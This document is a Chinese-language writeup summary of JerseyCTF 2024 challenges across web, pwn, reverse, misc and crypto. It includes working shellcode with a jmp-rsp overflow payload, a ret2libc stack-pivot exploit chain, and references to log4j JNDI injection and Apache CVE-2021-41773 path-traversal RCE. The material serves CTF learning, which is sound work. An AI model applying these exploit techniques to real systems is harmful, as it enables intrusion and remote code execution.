---
title: JerseyCTF Writeup (Web + Pwn + Misc + Forensics + Reverse + Crypto)
contest: JerseyCTF
year: 2024
difficulty: medium
vuln_type: web_unknown
tags: [log4j, Apache 2.4.49 RCE, shellcode jmp rsp, ret2libc, audio spectrogram, ROL ROR, RSA]
attack_chain: |
  1. Web Consent-N-Consent: 源码 http://44.210.135.76/sites/Nothing2.html 输入 12 → flag
  2. Web logging4joy: log4j payload 直接拿 flag
  3. Web mmmmm-rbs: flag 在 JWT 中 → jwt.io 解码
  4. Web require-all-denied: Apache/2.4.49 (Debian) CVE-2021-41773 path traversal RCE
  5. Pwn searching-through-vines: 直接 sh 拿 flag
  6. Pwn MathTest: 三个 long/char 答案 + sum == name
     - ans1 * 0x9000 <= 0 && ans1 >= 0 → 边界值 2^63-1 / 0x9000 = 250199979298361
     - ans2 < 0 && ans2 * 0xdeadbeef != 0 → -1
     - ans3 * 'z' == 'A' → ord('O')*i & 0xff == ord('A') = 65 → i=111 → 'o'
     - sum = 250199979298361 + (-1) + 111 = 250199979298471
  7. Pwn RunningOnPrayers / StageLeft: 0x20 字节 padding + jmp rsp (0x401231/0x401238) + shellcode
     - shellcode = execve("/bin//sh") 25 字节
     - asm("jmp $-0x30") 跳到前面 shellcode 起始
  8. Pwn Postage: ret2libc + 栈迁移 + ogg
     - 泄 gets libc → 0xebc81 one_gadget → 写到 bss → rsp_ret 迁移到 bss
  9. Misc internal-tensions: web.archive.org 历史快照 → flag 在注释
 10. Misc substitute-detail-torrent / groovy: strings / 音频频谱图
 11. Reverse PasswordManager: flag = [0x4f,0x46,0x51,0x43,0x5e,0x52,0x4d,0x16,0x57,0x16,0x56,0x7a,0x48,0x65,0x5c,0x65,0x1a,0x58] ^ 0x25 → jctf{wh3r3s_m@y@?}
 12. Reverse the-heist-1: 单字符独立加密 (^0x55 >> 4 ~ 减 0x60) → 模式匹配字典
 13. Crypto Attn-Agents: image.png
 14. Crypto adveRSAry: 解 RSA
key_payload: |
  # Pwn MathTest:
  ans = ['250199979298361', '-1', 'o']
  name = int(ans[0]) + int(ans[1]) + ord(ans[2])  # 250199979298471
  
  # Pwn RunningOnPrayers:
  shellcode_x64 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
  jmp_rsp = 0x401231
  p = shellcode_x64.ljust(0x20+8, b"A") + p64(jmp_rsp) + asm("jmp $-0x30")
  
  # Pwn Postage:
  base = int(io.recv(14), 16) - 0x1359
  rdi_rbp_ret = base + 0x1356
  gets_got = base + elf.got['gets']
  bss = base + 0x4100
  p = b"A"*(0x30+8) + p64(rdi_rbp_ret) + p64(gets_got) + b"A"*8 + p64(puts_plt)
  p += p64(rdi_rbp_ret) + p64(bss+0x8) + p64(bss) + p64(gets_plt)
  p += p64(rsp_ret) + p64(bss+0x8)
  gets = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
  libc_base = gets - libc.sym['gets']
  p = p64(libc_base + 0xebc81)  # one_gadget
  io.sendline(p)
  
  # Reverse PasswordManager:
  flag = [0x4f,0x46,0x51,0x43,0x5e,0x52,0x4d,0x16,0x57,0x16,0x56,0x7a,0x48,0x65,0x5c,0x65,0x1a,0x58]
  print(''.join(chr(i^0x25) for i in flag))  # jctf{wh3r3s_m@y@?}
one_liner: JerseyCTF 2024 多类目 writeup (Web log4j/Apache 2.4.49 / Pwn shellcode/ret2libc / Misc 频谱 / Reverse 字节 XOR / Crypto RSA)。
lesson: |
  - MathTest 整数边界: 2^63-1 / 0x9000 + (-1) + 111 = name 是固定模板
  - RunningOnPrayers jmp rsp + asm("jmp $-0x30") 跳回 shellcode 头部是经典 gadget
  - Postage: rdi_rbp_ret 替代 pop_rdi_ret (因 POP RDI; RET 不存在)
  - Reverse 单字符加密: 模式匹配字典 + 大表查询比逆运算快
  - Apache 2.4.49 (CVE-2021-41773) path traversal RCE
  - log4j ${jndi:ldap://...} 是 2022-2023 必会
quality: medium
---

# JerseyCTF Writeup

> 来源: ctfiot.com 169617 - 狼组安全社区

## Web

| 题 | 攻击 |
|----|------|
| Consent-N-Consent | 源码 http://44.210.135.76/sites/Nothing2.html 输入 12 → flag |
| logging4joy | log4j ${jndi:ldap://...} PoC 直接拿 flag |
| mmmmm-rbs | flag 在 JWT 中 |
| require-all-denied | Apache/2.4.49 (Debian) CVE-2021-41773 path traversal RCE |

## Pwn

### MathTest (整数约束)

```python
# 三个 long/char 答案 + sum == name
# 1. ans1 * 0x9000 <= 0 && ans1 >= 0 → 边界: 2^63-1 / 0x9000 = 250199979298361
# 2. ans2 < 0 && ans2 * 0xdeadbeef != 0 → -1
# 3. ans3 * 'z' == 'A' → ord('O')*i & 0xff == ord('A')=65 → i=111 → 'o'
# 4. ans1 + ans2 + ans3 == name
ans = ['250199979298361', '-1', 'o']
name = int(ans[0]) + int(ans[1]) + ord(ans[2])  # 250199979298471
```

### RunningOnPrayers / StageLeft (jmp rsp)

```python
shellcode_x64 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
jmp_rsp = 0x401231  # StageLeft 是 0x401238
p = shellcode_x64.ljust(0x20+8, b"A") + p64(jmp_rsp) + asm("jmp $-0x30")
# jmp $-0x30 跳回 shellcode 头部
```

### Postage (ret2libc + 栈迁移 + one_gadget)

```python
rdi_rbp_ret = base + 0x1356  # 替代 pop_rdi_ret
gets_got = base + elf.got['gets']
bss = base + 0x4100
gets_plt = base + elf.plt['gets']
rsp_ret = base + 0x1446

p = b"A"*(0x30+8) + p64(rdi_rbp_ret) + p64(gets_got) + b"A"*8 + p64(puts_plt)
p += p64(rdi_rbp_ret) + p64(bss+0x8) + p64(bss) + p64(gets_plt)
p += p64(rsp_ret) + p64(bss+0x8)
# 泄 gets libc → one_gadget
gets = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = gets - libc.sym['gets']
p = p64(libc_base + 0xebc81)  # one_gadget
```

## Misc / Forensics

| 题 | 解法 |
|----|------|
| internal-tensions | web.archive.org 历史快照 → 注释中找 flag |
| substitute-detail-torrent | strings / 010 注释 |
| groovy | 音频频谱图 |
| data-divergence-discovery | 字节比较差异 |
| the-droid-youre-looking-for | 审计 APK → activity_main |

## Reverse

### PasswordManager

```python
flag = [0x4f,0x46,0x51,0x43,0x5e,0x52,0x4d,0x16,0x57,0x16,0x56,0x7a,
        0x48,0x65,0x5c,0x65,0x1a,0x58]
print(''.join(chr(i^0x25) for i in flag))
# jctf{wh3r3s_m@y@?}
```

### the-heist-1 (单字符独立加密)

```c
for (int i=0; i<strlen(a); i++) {
    a[i] = a[i] ^ 0x55;
    a[i] = a[i] >> 4;
    a[i] = ~a[i];
    a[i] = a[i] - 0x60;
    printf("%c", a[i]);
}
```

每个字符独立加密 → 模式匹配字典 `!#$&()*+,-.0123456789:;<=>?@ABC...` → 输出 `[0xB2, 0x92, ...]`，在加密表里反查原字符。

## Crypto

- Attn-Agents: image.png
- adveRSAry: 标准 RSA

## 评价

JerseyCTF 2024 狼组搬运的多类目速查，Web/Pwn/Misc/Reverse/Crypto 都有，亮点是 MathTest 整数边界 + RunningOnPrayers jmp rsp + Postage 栈迁移 + the-heist-1 单字符加密反查表。
